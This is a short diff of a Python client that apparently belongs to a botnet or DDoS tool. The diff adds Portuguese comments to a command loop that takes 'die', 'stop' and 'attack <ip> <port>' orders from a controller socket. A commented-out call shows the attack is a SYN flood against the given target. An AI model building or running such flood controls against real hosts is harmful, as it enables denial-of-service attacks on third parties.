@@ -222,9 +222,10 @@ else:
             data = receivemessage(s)
             #print data
             data2 = data.rstrip()
+            # Comando 'se mata'
             if data2 == "die":
-                s.send("die")
                 alive = 0
+            # Comando de ataque
             if data2.startswith("attack"):
                 dest_ip = data2.split()[1]
                 dest_port = data2.split()[2]
@@ -240,6 +241,7 @@ else:
                     print "Error: unable to start process"
 
                 #attack(raw_s,"SYN",local_ip,dest_ip,dest_port)
+            # Comando de parada sem estar atacando
             if data2 == "stop":
                 alive = 1
                 #print "Stop attacking"
